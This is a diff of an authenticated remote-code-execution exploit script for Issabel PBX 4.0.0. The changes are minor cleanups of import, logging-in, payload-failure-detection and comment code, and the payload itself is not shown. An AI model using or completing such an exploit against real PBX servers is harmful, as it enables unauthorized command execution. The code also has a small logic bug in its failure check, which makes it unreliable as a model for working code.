@@ -6,7 +6,7 @@ import signal
 import base64
 import time
 import warnings
-import re
+
 
 """
 Issabel PBX 4.0.0 Remote Code Execution - Authenticated
@@ -116,9 +116,7 @@ def check_if_https_in_url(url: str, port: int)->str:
 
 
 def injection_file_failed(response_text: str):
-    pattern = re.compile(r'\bCommand\b.*\bfailed\.\b', re.IGNORECASE)
-    
-    # Search for the words 'Command' and 'failed.' might indicate that the payload could not be uploaded
+    # Search for the words 'Command' and 'failed.'. This might indicate that the payload could not be uploaded
     for line in response_text.split('\n'):
         if 'Command' and 'failed.' in line:
             return True, line
@@ -149,7 +147,6 @@ def login_request(url: str, args: argparse.Namespace)->requests.sessions.Session
     login_data = {"input_user": args.user, "input_pass": args.password, "submit_login": ''}
     # Make the login request to the server
     print(f"{STAR} {color['GREEN']}Trying to log in to {color['YELLOW']}{url!r}{color['GREEN']} with credential {color['YELLOW']}'{args.user}:{args.password}'{color['GREEN']}... {color['RESET']}")
-    #r = requests.post(url, headers=generic_header, cookies=generic_cookie, data=login_data, verify=False) # verify=False to avoid 'SSL' cert problems (this will print a warning message anyways)
     try:
         # Make a request with a generic session
         session = requests.Session()
@@ -203,7 +200,7 @@ def request_payload(url: str, session:requests.sessions.Session, injected_payloa
 
 def exploit(args: argparse.Namespace)->None:
     # Check url
-    url = f"{check_if_https_in_url(args.target, args.port)}"
+    url = check_if_https_in_url(args.target, args.port)
     # Log in
     session = login_request(url, args)
     # Once logged in, upload the payload
@@ -220,7 +217,7 @@ def main()->None:
     # Print my pretty banner made with love
     if not args.no_banner:
         print_banner()
-    # By default, ignore all warnings (related to unsacrue SSL connections)
+    # By default, ignore all warnings (related to unsecure SSL connections)
     if args.show_warnings:
         warnings.filterwarnings("ignore")
     # Run the exploit and pray it works
